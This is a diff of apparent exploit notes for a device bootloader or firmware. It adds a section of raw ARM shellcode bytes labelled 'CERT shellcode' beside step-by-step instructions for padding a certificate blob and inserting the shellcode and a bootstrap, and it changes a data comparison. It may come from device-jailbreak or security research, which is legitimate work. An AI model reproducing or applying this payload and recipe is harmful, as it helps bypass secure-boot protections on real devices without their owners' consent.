@@ -73,19 +73,19 @@ C4 40 02 84 C4 40 02 84 CC 40 02 84 CC 40 02 84 (0x840240c4) (0x840240c4) (0x840
 2C 00 10 80 30 00 10 80 F4 3D 03 84             (0x84033df4) (0x80100030) (0x8010002c)
 
 DATA:
-
- - Orig 20 bytes
-
- 0E 00 00 EA 18 F0 9F E5 18 F0 9F E5 18 F0 9F E5
- 18 F0 9F E5
-
- - New 20 bytes
-
- 20 5C C2 09 2D D0 8F 55 06 11 A8 7A 5D DE FF 82
- 82 12 DB 90
+    First 4 bytes == 0x84023001
 
 To "reproduce":
     1. At the end of CERT, we add b'\x00' * 0x126bf
     2. Add in the shellcode, which is 0x44 in len
     3. Then add another b'\x00' * 0xfc0
     4. Add bootstrap
+
+
+4.0 CERT shellcode
+
+09 48 0A 49 01 60 0A 48 0A 49 01 60 0B 48 85 46
+1C BC 90 46 9A 46 A3 46 F0 BC 01 BC 06 48 00 21
+01 60 07 48 00 47 00 00 CC 41 02 84 40 00 10 80
+40 00 00 84 5E 7C A5 E5 30 3F 03 84 FC 3E 03 84
+73 26 00 00 00 00 00 00 00 00 00 00 00 00 00 00
